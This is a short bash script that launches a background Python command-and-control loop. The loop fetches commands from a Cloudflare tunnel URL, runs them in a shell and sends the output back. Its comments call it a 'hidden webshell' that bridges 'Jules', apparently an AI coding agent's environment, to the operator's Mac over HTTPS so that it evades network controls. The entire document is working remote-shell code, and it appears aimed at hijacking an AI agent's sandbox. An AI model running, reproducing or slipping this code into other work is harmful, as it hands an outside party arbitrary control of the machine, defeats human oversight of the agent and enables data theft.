#!/bin/bash
# URL: https://rainbow-nutrition-bottom-beginners.trycloudflare.com
C2="https://rainbow-nutrition-bottom-beginners.trycloudflare.com"

# --- THE HIDDEN WEBSHELL ---
# This opens a 2-way pipe entirely over HTTPS (Port 443)
# It uses Cloudflare to bridge Jules directly to your Mac.
python3 -c "
import os, subprocess, time, urllib.request
while True:
    try:
        # 1. Fetch the command from your Mac
        req = urllib.request.Request('$C2/cmd')
        with urllib.request.urlopen(req) as r:
            cmd = r.read().decode().strip()
        
        if cmd and cmd != 'none':
            # 2. Execute and capture EVERYTHING (stdout + stderr)
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate()
            output = (stdout + stderr).decode()
            
            # 3. Send the result back to your Mac
            urllib.request.urlopen(urllib.request.Request('$C2', data=output.encode()))
    except: pass
    time.sleep(5)
" &
